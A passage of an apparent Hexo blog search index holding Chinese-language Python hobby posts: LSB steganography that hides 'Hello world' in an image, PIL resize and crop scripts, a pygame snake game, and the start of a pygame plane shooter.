evenPixels = [(r&gt;&gt;1&lt;&lt;1,g&gt;&gt;1&lt;&lt;1,b&gt;&gt;1&lt;&lt;1,t&gt;&gt;1&lt;&lt;1) for [r,g,b,t] in pixels] # &#x66F4;&#x6539;&#x6240;&#x6709;&#x503C;&#x4E3A;&#x5076;&#x6570;&#xFF08;&#x9B54;&#x6CD5;&#x822C;&#x7684;&#x79FB;&#x4F4D;&#xFF09; evenImage = Image.new(image.mode, image.size) # &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x76F8;&#x540C;&#x5927;&#x5C0F;&#x7684;&#x56FE;&#x7247;&#x526F;&#x672C; evenImage.putdata(evenPixels) # &#x628A;&#x4E0A;&#x9762;&#x7684;&#x50CF;&#x7D20;&#x653E;&#x5165;&#x5230;&#x56FE;&#x7247;&#x526F;&#x672C; return evenImage&quot;&quot;&quot;&#x5185;&#x7F6E;&#x51FD;&#x6570; bin() &#x7684;&#x66FF;&#x4EE3;&#xFF0C;&#x8FD4;&#x56DE;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&quot;&quot;&quot;def constLenBin(int): binary = &quot;0&quot;*(8-(len(bin(int))-2))+bin(int).replace(&apos;0b&apos;,&apos;&apos;) # &#x53BB;&#x6389; bin() &#x8FD4;&#x56DE;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684; &apos;0b&apos;&#xFF0C;&#x5E76;&#x5728;&#x5DE6;&#x8FB9;&#x8865;&#x8DB3; &apos;0&apos; &#x76F4;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x4E3A; 8 return binary&quot;&quot;&quot;&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x7F16;&#x7801;&#x5230;&#x56FE;&#x7247;&#x4E2D;&quot;&quot;&quot;def encodeDataInImage(image, data): evenImage = makeImageEven(image) # &#x83B7;&#x5F97;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E3A; 0 &#x7684;&#x56FE;&#x7247;&#x526F;&#x672C; binary = &apos;&apos;.join(map(constLenBin,bytearray(data, &apos;utf-8&apos;))) # &#x5C06;&#x9700;&#x8981;&#x88AB;&#x9690;&#x85CF;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32; if len(binary) &gt; len(image.getdata()) * 4: # &#x5982;&#x679C;&#x4E0D;&#x53EF;&#x80FD;&#x7F16;&#x7801;&#x5168;&#x90E8;&#x6570;&#x636E;&#xFF0C; &#x629B;&#x51FA;&#x5F02;&#x5E38; raise Exception(&quot;Error: Can&apos;t encode more than &quot; + len(evenImage.getdata()) * 4 + &quot; bits in this image. &quot;) encodedPixels = [(r+int(binary[index*4+0]),g+int(binary[index*4+1]),b+int(binary[index*4+2]),t+int(binary[index*4+3])) if index*4 &lt; len(binary) else (r,g,b,t) for index,(r,g,b,t) in enumerate(list(evenImage.getdata()))] # &#x5C06; binary &#x4E2D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4FE1;&#x606F;&#x7F16;&#x7801;&#x8FDB;&#x50CF;&#x7D20;&#x91CC; encodedImage = Image.new(evenImage.mode, evenImage.size) # &#x521B;&#x5EFA;&#x65B0;&#x56FE;&#x7247;&#x4EE5;&#x5B58;&#x653E;&#x7F16;&#x7801;&#x540E;&#x7684;&#x50CF;&#x7D20; encodedImage.putdata(encodedPixels) # &#x6DFB;&#x52A0;&#x7F16;&#x7801;&#x540E;&#x7684;&#x6570;&#x636E; return encodedImage&quot;&quot;&quot;&#x4ECE;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x4E3A; UTF-8 &#x5B57;&#x7B26;&#x4E32;&quot;&quot;&quot;def binaryToString(binary): index = 0 string = [] rec = lambda x, i: x[2:8] + (rec(x[8:], i-1) if i &gt; 1 else &apos;&apos;) if x else &apos;&apos; # rec = lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &apos;&apos;)) or &apos;&apos; fun = lambda x, i: x[i+1:8] + rec(x[8:], i-1) while index + 1 &lt; len(binary): chartype = binary[index:].index(&apos;0&apos;) # &#x5B58;&#x653E;&#x5B57;&#x7B26;&#x6240;&#x5360;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B57;&#x7B26;&#x4F1A;&#x5B58;&#x4E3A; 0 length = chartype*8 if chartype else 8 string.append(chr(int(fun(binary[index:index+length],chartype),2))) index += length return &apos;&apos;.join(string)&quot;&quot;&quot;&#x89E3;&#x7801;&#x9690;&#x85CF;&#x6570;&#x636E;&quot;&quot;&quot;def decodeImage(image): pixels = list(image.getdata()) # &#x83B7;&#x5F97;&#x50CF;&#x7D20;&#x5217;&#x8868; binary = &apos;&apos;.join([str(int(r&gt;&gt;1&lt;&lt;1!=r))+str(int(g&gt;&gt;1&lt;&lt;1!=g))+str(int(b&gt;&gt;1&lt;&lt;1!=b))+str(int(t&gt;&gt;1&lt;&lt;1!=t)) for (r,g,b,t) in pixels]) # &#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x6240;&#x6709;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E2D;&#x7684;&#x6570;&#x636E; # &#x627E;&#x5230;&#x6570;&#x636E;&#x622A;&#x6B62;&#x5904;&#x7684;&#x7D22;&#x5F15; locationDoubleNull = binary.find(&apos;0000000000000000&apos;) endIndex = locationDoubleNull+(8-(locationDoubleNull % 8)) if locationDoubleNull%8 != 0 else locationDoubleNull data = binaryToString(binary[0:endIndex]) return dataencodeDataInImage(Image.open(&quot;coffee.png&quot;), &apos;&#x4F60;&#x597D;&#x4E16;&#x754C;&#xFF0C;Hello world!&apos;).save(&apos;encodeImage.png&apos;)print(decodeImage(Image.open(&quot;encodeImage.png&quot;))) note: &#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#xFF08;&#x82F1;&#x8BED;&#xFF1A;Least Significant Bit&#xFF0C;lsb&#xFF09;&#x662F;&#x6307;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x5B57;&#x4E2D;&#x7684;&#x7B2C;0&#x4F4D;&#xFF08;&#x5373;&#x6700;&#x4F4E;&#x4F4D;&#xFF09;&#xFF0C;&#x6743;&#x503C;&#x4E3A;2^0&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x5B83;&#x6765;&#x68C0;&#x6D4B;&#x6570;&#x7684;&#x5947;&#x5076;&#x6027;&#x3002;&#x4E0E;&#x4E4B;&#x76F8;&#x53CD;&#x7684;&#x79F0;&#x4E4B;&#x4E3A;&#x6700;&#x9AD8;&#x6709;&#x6548;&#x4F4D;&#x3002;&#x5728;&#x5927;&#x7AEF;&#x5E8F;&#x4E2D;&#xFF0C;lsb&#x6307;&#x6700;&#x53F3;&#x8FB9;&#x7684;&#x4F4D;&#x3002;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4EE3;&#x8868;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x4E2D;&#x7684;&#x6700;&#x5C0F;&#x7684;&#x5355;&#x4F4D;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6307;&#x793A;&#x6570;&#x5B57;&#x5F88;&#x5C0F;&#x7684;&#x53D8;&#x5316;&#x3002;LSB&#xFF08;&#x5168;&#x5927;&#x5199;&#xFF09;&#x6709;&#x65F6;&#x4E5F;&#x6307;Least Significant Byte&#xFF0C;&#x6307;&#x591A;&#x5B57;&#x8282;&#x5E8F;&#x5217;&#x4E2D;&#x6700;&#x5C0F;&#x6743;&#x91CD;&#x7684;&#x5B57;&#x8282;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PIL change image]]></title>
    <url>%2F2018%2F10%2F10%2FPIL-resize-image%2F</url>
    <content type="text"><![CDATA[&#x8FD0;&#x7528;PIL&#x6539;&#x53D8;&#x56FE;&#x7247;&#x7684;&#x5927;&#x5C0F;&#x4E4B;&#x524D;&#x4E00;&#x76F4;&#x4F7F;&#x7528;&#x4ECE;&#x522B;&#x4EBA;&#x7F51;&#x7AD9;&#x4E0A;&#x76D7;&#x53D6;&#x7684;&#x56FE;&#x7247;&#xFF08;&#x5982;&#x679C;&#x5185;&#x5BB9;&#x6D89;&#x53CA;&#x5230;&#x4FB5;&#x6743;&#x7684;&#x8BDD;&#x8BF7;&#x8054;&#x7CFB;&#x6211;&#xFF0C;&#x6211;&#x4F1A;&#x628A;&#x4ED6;&#x4EEC;&#x5220;&#x9664;&#x7684;^_^&#xFF09;,&#x4ECA;&#x5929;&#x81EA;&#x5DF1;&#x627E;&#x4E86;&#x4E2A;&#x56FE;&#x7247;&#xFF0C;&#x56E0;&#x4E3A;&#x56FE;&#x7247;&#x5927;&#x5C0F;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x653E;&#x5230;blog&#x4E0A;&#x9762;&#x592A;&#x4E0D;&#x7F8E;&#x89C2;&#x4E86;&#x3002;&#x60F3;&#x5230;&#x524D;&#x51E0;&#x5929;&#x5B66;&#x7684;pillow&#x5E93;&#xFF0C;&#x7075;&#x673A;&#x4E00;&#x52A8;&#x5728;&#x7F51;&#x4E0A;&#x627E;&#x4E86;&#x4E2A;&#x5173;&#x4E8E;&#x4F7F;&#x7528;python&#x4FEE;&#x6539;&#x56FE;&#x7247;&#x5927;&#x5C0F;&#x7684;&#x6559;&#x7A0B;&#xFF0C;&#x81EA;&#x5DF1;&#x53C8;&#x6539;&#x4E86;&#x4E9B;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x6539;&#x53D8;&#x56FE;&#x7247;&#x5927;&#x5C0F;&#x7684;&#x5C0F;&#x7A0B;&#x5E8F;&#x3002;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E0B;&#x6548;&#x679C;&#x8FD8;&#x4E0D;&#x9519;&#x3002;&#x8FD9;&#x91CC;&#x9762;&#x6709;&#x4E2A;&#x5751;&#x5C31;&#x662F;y_x&#x7684;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x662F;int&#x7C7B;&#x578B;&#x7684;&#xFF0C;&#x4E0D;&#x7136;&#x7684;&#x8BDD;&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#x4E00;&#x76F4;&#x62A5;&#x9519;&#x3002; adjust.py1234567891011121314151617181920212223242526272829303132333435from PIL import Imageimport argparse&quot;&quot;&quot;Usage python3 adjust.py [infile]Options: -h --help show this on screen.&quot;&quot;&quot;parser = argparse.ArgumentParser()parser.add_argument(&quot;infile&quot;)args = parser.parse_args()infile = args.infileoutfile = &quot;resize_&quot;+infileim = Image.open(infile)print(im.size)(x, y) = im.sizeprint(im)x_s = 529y_s = (int)(y * x_s / x)out = im.resize((x_s, y_s), Image.ANTIALIAS)out.save(outfile)print(&quot;original size : &quot;, x, y)print(&quot;adjust size : &quot;, x_s, y_s) &#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A;&#x6539;&#x4E4B;&#x524D;&#xFF1A;&#x6539;&#x4E4B;&#x540E;&#xFF1A; &#x67E5;&#x770B;&#x56FE;&#x7247;&#x50CF;&#x7D20;view.py123456789101112131415161718192021222324252627from PIL import Imageimport argparse&quot;&quot;&quot;Usage python3 adjust.py [infile]Options: -h --help show this on screen.&quot;&quot;&quot;parser = argparse.ArgumentParser()parser.add_argument(&quot;infile&quot;)args = parser.parse_args()infile = args.infileim = Image.open(infile)im = im.convert(&apos;RGBA&apos;)pixdata = im.load()for x in range(im.size[0]): for y in range(im.size[1]): print(pixdata[x, y]) &#x526A;&#x5207;&#x56FE;&#x7247;1234567891011121314151617181920212223242526272829303132from PIL import Imageimport argparse&quot;&quot;&quot;Usage python3 crop.py [infile]Options: -h --help show this on screen.&quot;&quot;&quot;parser = argparse.ArgumentParser()parser.add_argument(&quot;infile&quot;)args = parser.parse_args()infile = args.infileoutfile = &quot;corp_&quot; + infileim = Image.open(infile)&apos;&apos;&apos;&#x88C1;&#x526A;&#xFF1A;&#x4F20;&#x5165;&#x4E00;&#x4E2A;&#x5143;&#x7EC4;&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x5143;&#x7EC4;&#x91CC;&#x7684;&#x5143;&#x7D20;&#x5206;&#x522B;&#x662F;&#xFF1A;&#xFF08;&#x8DDD;&#x79BB;&#x56FE;&#x7247;&#x5DE6;&#x8FB9;&#x754C;&#x8DDD;&#x79BB;x&#xFF0C; &#x8DDD;&#x79BB;&#x56FE;&#x7247;&#x4E0A;&#x8FB9;&#x754C;&#x8DDD;&#x79BB;y&#xFF0C;&#x8DDD;&#x79BB;&#x56FE;&#x7247;&#x5DE6;&#x8FB9;&#x754C;&#x8DDD;&#x79BB;+&#x88C1;&#x526A;&#x6846;&#x5BBD;&#x5EA6;x+w&#xFF0C;&#x8DDD;&#x79BB;&#x56FE;&#x7247;&#x4E0A;&#x8FB9;&#x754C;&#x8DDD;&#x79BB;+&#x88C1;&#x526A;&#x6846;&#x9AD8;&#x5EA6;y+h&#xFF09;&apos;&apos;&apos;x = 133y = 0w = 533h = 533region = im.crop((x, y, x+w, y+h))region.save(outfile) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
        <category>pillow</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pillow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pygame development snake game]]></title>
    <url>%2F2018%2F10%2F10%2FPygame-development-snake-game%2F</url>
    <content type="text"><![CDATA[&#x4ECA;&#x5929;&#x7528;python&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x8D2A;&#x5403;&#x86C7;&#x7684;&#x6E38;&#x620F;&#xFF0C;&#x76EE;&#x524D;&#x529F;&#x80FD;&#x8FD8;&#x4E0D;&#x5B8C;&#x5584;&#xFF0C;&#x4F46;&#x662F;&#x57FA;&#x672C;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x6709;&#x4E86;&#x3002;game.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127import pygameimport timeimport randompygame.init()white = (255, 255, 255)black = (0, 0, 0)red = (255, 0, 0)favorite1 = (43, 95, 117)favorite2 = (219, 142, 113)screen_height = 800screen_width = 800rect_size = 30FPS = 30snake_list = []gameDisplay = pygame.display.set_mode((screen_height, screen_width))pygame.display.set_caption(&apos;snake game&apos;)pygame.display.update()font = pygame.font.SysFont(None, 25)clock = pygame.time.Clock()def message_to_screen(msg, color, x, y): screen_text = font.render(msg, True, color) gameDisplay.blit(screen_text, [x, y])def snake(snake_list): print(len(snake_list)) for XnY in snake_list: pygame.draw.rect(gameDisplay, favorite2, [XnY[0], XnY[1], rect_size, rect_size])def gameLoop(): gameExit = False gameOver = False change_load_x = 0 change_load_y = 0 snake_length = 1 center_x = screen_width/2 center_y = screen_height/2 load_x = center_x load_y = center_y Apple_x = (random.randrange(0, screen_width-rect_size)/10)*10 Apple_y = (random.randrange(0, screen_height-rect_size)/10)*10 while not gameExit: while gameOver: gameDisplay.fill(black) message_to_screen(&quot;Do you want to play again? press &apos;y&apos; to continue, or &apos;q&apos; to quit: &quot;, favorite2, center_x-120, center_y-120) pygame.display.update() for event in pygame.event.get(): if event.type == pygame.KEYDOWN: if event.key == pygame.K_y: gameOver = False load_x = center_x load_y = center_y change_load_x = 0 change_load_y = 0 elif event.key == pygame.K_q: pygame.quit() quit() for event in pygame.event.get(): if event.type == pygame.QUIT: gameExit = True if event.type == pygame.KEYDOWN: if event.key == pygame.K_LEFT: change_load_x = -10 change_load_y = 0 if event.key == pygame.K_RIGHT: change_load_x = 10 change_load_y = 0 if event.key == pygame.K_UP: change_load_y = -10 change_load_x = 0 if event.key == pygame.K_DOWN: change_load_y = 10 change_load_x = 0 if load_x &lt; 0 or load_x &gt;= screen_width or load_y &lt; 0 or load_y &gt;= screen_height: gameOver = True load_x += change_load_x load_y += change_load_y gameDisplay.fill(favorite1) pygame.draw.rect(gameDisplay, red, [Apple_x, Apple_y, rect_size, rect_size]) snake_head = [] snake_head.append(load_x) snake_head.append(load_y) snake_list.append(snake_head) if len(snake_list) &gt; snake_length: del snake_list[0] snake(snake_list) if abs(load_x-Apple_x) &lt; 10 and abs(load_y-Apple_y) &lt; 10: Apple_x = (random.randrange(0, screen_width - rect_size) / 10) * 10 Apple_y = (random.randrange(0, screen_height - rect_size) / 10) * 10 snake_length += 1 pygame.display.update() clock.tick(FPS)gameLoop() &#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>python</category>
        <category>pygame</category>
        <category>game</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>game</tag>
        <tag>pygame</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pygame development plane game]]></title>
    <url>%2F2018%2F10%2F09%2FPygame-development-plane-game%2F</url>
    <content type="text"><![CDATA[Python&#x771F;&#x662F;&#x592A;&#x5F3A;&#x5927;&#x4E86;&#xFF0C;&#x5F53;&#x6211;&#x770B;&#x5230;&#x522B;&#x4EBA;&#x7528;pygame&#x5199;&#x51FA;&#x7684;Super Mario&#x65F6;&#x2026;&#x2026;&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x4E00;&#x4E2A;12&#x5C81;&#x7684;&#x5C0F;&#x5B69;&#x7ADF;&#x7136;&#x80FD;&#x5199;&#x51FA;&#x201C;&#x5154;&#x5B50;&#x548C;&#x737E;&#x201D;&#x8FD9;&#x6837;&#x7684;&#x6E38;&#x620F;&#x6765;&#x3002;&#x5728;&#x60F3;&#x60F3;&#x90A3;&#x65F6;&#x7684;&#x81EA;&#x5DF1;&#xFF0C;&#x771F;&#x7684;&#x662F;&#x7FA1;&#x6155;&#xFF0C;&#x5AC9;&#x5992;&#xFF0C;&#x6068;&#x5440;&#xFF01; &#x5154;&#x5B50;&#x548C;&#x737E;Super Mario&#x771F;&#x7684;&#x662F;&#x592A;&#x5389;&#x5BB3;&#x4E86; game.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276# -*- coding: utf-8 -*-import pygamefrom sys import exitfrom pygame.locals import *import random# &#x8BBE;&#x7F6E;&#x6E38;&#x620F;&#x5C4F;&#x5E55;&#x5927;&#x5C0F;SCREEN_WIDTH = 480SCREEN_HEIGHT = 800# &#x5B50;&#x5F39;&#x7C7B;class Bullet(pygame.sprite.Sprite): def __init__(self, bullet_img, init_pos): pygame.sprite.Sprite.__init__(self) self.image = bullet_img self.rect = self.image.get_rect() self.rect.midbottom = init_pos self.speed = 10 def move(self): self.rect.top -= self.speed# &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x7C7B;class Player(pygame.sprite.Sprite): def __init__(self, plane_img, player_rect, init_pos): pygame.sprite.Sprite.__init__(self) self.image = [] # &#x7528;&#x6765;&#x5B58;&#x50A8;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x56FE;&#x7247;&#x7684;&#x5217;&#x8868; for i in range(len(player_rect)): self.image.append(plane_img.subsurface(player_rect[i]).convert_alpha()) self.rect = player_rect[0] # &#x521D;&#x59CB;&#x5316;&#x56FE;&#x7247;&#x6240;&#x5728;&#x7684;&#x77E9;&#x5F62; self.rect.topleft = init_pos # &#x521D;&#x59CB;&#x5316;&#x77E9;&#x5F62;&#x7684;&#x5DE6;&#x4E0A;&#x89D2;&#x5750;&#x6807; self.speed = 8 # &#x521D;&#x59CB;&#x5316;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x901F;&#x5EA6;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x4E00;&#x4E2A;&#x786E;&#x5B9A;&#x7684;&#x503C; self.bullets = pygame.sprite.Group() # &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x6240;&#x53D1;&#x5C04;&#x7684;&#x5B50;&#x5F39;&#x7684;&#x96C6;&#x5408; self.img_index = 0 # &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x56FE;&#x7247;&#x7D22;&#x5F15; self.is_hit = False # &#x73A9;&#x5BB6;&#x662F;&#x5426;&#x88AB;&#x51FB;&#x4E2D; # &#x53D1;&#x5C04;&#x5B50;&#x5F39; def shoot(self, bullet_img): bullet = Bullet(bullet_img, self.rect.midtop) self.bullets.add(bullet) # &#x5411;&#x4E0A;&#x79FB;&#x52A8;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x8FB9;&#x754C; def moveUp(self): if self.rect.top &lt;= 0: self.rect.top = 0 else: self.rect.top -= self.speed # &#x5411;&#x4E0B;&#x79FB;&#x52A8;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x8FB9;&#x754C; def moveDown(self): if self.rect.top &gt;= SCREEN_HEIGHT - self.rect.height: self.rect.top = SCREEN_HEIGHT - self.rect.height else: self.rect.top += self.speed # &#x5411;&#x5DE6;&#x79FB;&#x52A8;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x8FB9;&#x754C; def moveLeft(self): if self.rect.left &lt;= 0: self.rect.left = 0 else: self.rect.left -= self.speed # &#x5411;&#x53F3;&#x79FB;&#x52A8;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x8FB9;&#x754C; def moveRight(self): if self.rect.left &gt;= SCREEN_WIDTH - self.rect.width: self.rect.left = SCREEN_WIDTH - self.rect.width else: self.rect.left += self.speed# &#x654C;&#x673A;&#x7C7B;class Enemy(pygame.sprite.Sprite): def __init__(self, enemy_img, enemy_down_imgs, init_pos): pygame.sprite.Sprite.__init__(self) self.image = enemy_img self.rect = self.image.get_rect() self.rect.topleft = init_pos self.down_imgs = enemy_down_imgs self.speed = 2 self.down_index = 0 # &#x654C;&#x673A;&#x79FB;&#x52A8;&#xFF0C;&#x8FB9;&#x754C;&#x5224;&#x65AD;&#x53CA;&#x5220;&#x9664;&#x5728;&#x6E38;&#x620F;&#x4E3B;&#x5FAA;&#x73AF;&#x91CC;&#x5904;&#x7406; def move(self): self.rect.top += self.speed# &#x521D;&#x59CB;&#x5316; pygamepygame.init()# &#x8BBE;&#x7F6E;&#x6E38;&#x620F;&#x754C;&#x9762;&#x5927;&#x5C0F;&#x3001;&#x80CC;&#x666F;&#x56FE;&#x7247;&#x53CA;&#x6807;&#x9898;# &#x6E38;&#x620F;&#x754C;&#x9762;&#x50CF;&#x7D20;&#x5927;&#x5C0F;screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))# &#x6E38;&#x620F;&#x754C;&#x9762;&#x6807;&#x9898;pygame.display.set_caption(&apos;&#x98DE;&#x673A;&#x5927;&#x6218;&apos;)# &#x80CC;&#x666F;&#x56FE;background = pygame.image.load(&apos;PythonShootGame/resources/image/background.png&apos;).convert()# Game Over &#x7684;&#x80CC;&#x666F;&#x56FE;game_over = pygame.image.load(&apos;PythonShootGame/resources/image/gameover.png&apos;)# &#x98DE;&#x673A;&#x53CA;&#x5B50;&#x5F39;&#x56FE;&#x7247;&#x96C6;&#x5408;plane_img = pygame.image.load(&apos;PythonShootGame/resources/image/shoot.png&apos;)# &#x8BBE;&#x7F6E;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x4E0D;&#x540C;&#x72B6;&#x6001;&#x7684;&#x56FE;&#x7247;&#x5217;&#x8868;&#xFF0C;&#x591A;&#x5F20;&#x56FE;&#x7247;&#x5C55;&#x793A;&#x4E3A;&#x52A8;&#x753B;&#x6548;&#x679C;player_rect = []player_rect.append(pygame.Rect(0, 99, 102, 126)) # &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x56FE;&#x7247;player_rect.append(pygame.Rect(165, 360, 102, 126))player_rect.append(pygame.Rect(165, 234, 102, 126)) # &#x73A9;&#x5BB6;&#x7206;&#x70B8;&#x56FE;&#x7247;player_rect.append(pygame.Rect(330, 624, 102, 126))player_rect.append(pygame.Rect(330, 498, 102, 126))player_rect.append(pygame.Rect(432, 624, 102, 126))player_pos = [200, 600]player = Player(plane_img, player_rect, player_pos)# &#x5B50;&#x5F39;&#x56FE;&#x7247;bullet_rect = pygame.Rect(1004, 987, 9, 21)bullet_img = plane_img.subsurface(bullet_rect)# &#x654C;&#x673A;&#x4E0D;&#x540C;&#x72B6;&#x6001;&#x7684;&#x56FE;&#x7247;&#x5217;&#x8868;&#xFF0C;&#x591A;&#x5F20;&#x56FE;&#x7247;&#x5C55;&#x793A;&#x4E3A;&#x52A8;&#x753B;&#x6548;&#x679C;enemy1_rect = pygame.Rect(534, 612, 57, 43)enemy1_img = plane_img.subsurface(enemy1_rect)enemy1_down_imgs = []enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(267, 347, 57, 43)))enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(873, 697, 57, 43)))enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(267, 296, 57, 43)))enemy1_down_imgs.append(plane_img.subsurface(pygame.Rect(930, 697, 57, 43)))enemies1 = pygame.sprite.Group()# &#x5B58;&#x50A8;&#x88AB;&#x51FB;&#x6BC1;&#x7684;&#x98DE;&#x673A;&#xFF0C;&#x7528;&#x6765;&#x6E32;&#x67D3;&#x51FB;&#x6BC1;&#x52A8;&#x753B;enemies_down = pygame.sprite.Group()# &#x521D;&#x59CB;&#x5316;&#x5C04;&#x51FB;&#x53CA;&#x654C;&#x673A;&#x79FB;&#x52A8;&#x9891;&#x7387;shoot_frequency = 0enemy_frequency = 0# &#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x88AB;&#x51FB;&#x4E2D;&#x540E;&#x7684;&#x6548;&#x679C;&#x5904;&#x7406;player_down_index = 16# &#x521D;&#x59CB;&#x5316;&#x5206;&#x6570;score = 0# &#x6E38;&#x620F;&#x5FAA;&#x73AF;&#x5E27;&#x7387;&#x8BBE;&#x7F6E;clock = pygame.time.Clock()# &#x5224;&#x65AD;&#x6E38;&#x620F;&#x5FAA;&#x73AF;&#x9000;&#x51FA;&#x7684;&#x53C2;&#x6570;running = True# &#x6E38;&#x620F;&#x4E3B;&#x5FAA;&#x73AF;while running: # &#x63A7;&#x5236;&#x6E38;&#x620F;&#x6700;&#x5927;&#x5E27;&#x7387;&#x4E3A; 60 clock.tick(60) # &#x751F;&#x6210;&#x5B50;&#x5F39;&#xFF0C;&#x9700;&#x8981;&#x63A7;&#x5236;&#x53D1;&#x5C04;&#x9891;&#x7387; # &#x9996;&#x5148;&#x5224;&#x65AD;&#x73A9;&#x5BB6;&#x98DE;&#x673A;&#x6CA1;&#x6709;&#x88AB;&#x51FB;&#x4E2D; if not player.is_hit: if shoot_frequency % 15 == 0: player.shoot(bullet_img) shoot_frequency += 1 if shoot_frequency &gt;= 15: shoot_frequency = 0 # &#x751F;&#x6210;&#x654C;&#x673A;&#xFF0C;&#x9700;&#x8981;&#x63A7;&#x5236;&#x751F;&#x6210;&#x9891;&#x7387; if enemy_frequency % 50 == 0: enemy1_pos = [random.randint(0, SCREEN_WIDTH - enemy1_rect.width), 0] enemy1 = Enemy(enemy1_img, enemy1_down_imgs, enemy1_pos) enemies1.add(enemy1) enemy_frequency += 1 if enemy_frequency &gt;= 100: enemy_frequency = 0 for bullet in player.bullets: # &#x4EE5;&#x56FA;&#x5B9A;&#x901F;&#x5EA6;&#x79FB;&#x52A8;&#x5B50;&#x5F39; bullet.move() # &#x79FB;&#x52A8;&#x51FA;&#x5C4F;&#x5E55;&#x540E;&#x5220;&#x9664;&#x5B50;&#x5F39; if bullet.rect.bottom &lt; 0: player.bullets.remove(bullet) for enemy in enemies1: #2. &#x79FB;&#x52A8;&#x654C;&#x673A; enemy.move() #3. 